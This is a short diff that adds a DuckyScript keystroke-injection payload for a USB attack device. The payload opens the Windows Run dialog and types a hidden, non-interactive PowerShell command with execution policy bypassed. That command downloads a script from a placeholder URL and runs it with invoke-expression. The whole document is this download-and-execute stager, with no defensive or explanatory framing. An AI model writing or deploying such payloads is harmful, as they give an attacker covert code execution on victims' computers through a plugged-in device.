@@ -1,0 +1,4 @@
+GUI r
+DELAY 500
+STRING powershell -w h -NoP -NonI -Exec Bypass $pl = iwr <url>; invoke-expression $pl
+ENTER
